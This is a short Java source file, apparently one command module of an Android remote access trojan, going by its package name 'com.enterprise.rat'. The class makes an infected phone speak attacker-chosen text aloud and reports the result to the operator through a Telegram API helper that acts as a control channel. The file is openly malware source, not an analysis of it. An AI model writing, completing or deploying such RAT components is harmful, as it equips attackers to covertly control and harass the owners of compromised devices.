package com.enterprise.rat.commands;

import android.content.Context;
import android.speech.tts.TextToSpeech;
import com.enterprise.rat.utils.TelegramApi;
import java.util.Locale;

public class TTSSpeakManager {
    private Context context;
    private TextToSpeech tts;

    public TTSSpeakManager(Context context) { this.context = context; }

    public void speak(String text) {
        if (tts != null) { tts.stop(); tts.shutdown(); }
        tts = new TextToSpeech(context, status -> {
            if (status == TextToSpeech.SUCCESS) {
                tts.setLanguage(Locale.US);
                tts.speak(text, TextToSpeech.QUEUE_FLUSH, null, "REX_TTS");
                TelegramApi.sendMessage("🔊 Speaking: " + text);
            } else {
                TelegramApi.sendMessage("❌ TTS init failed");
            }
        });
    }
}
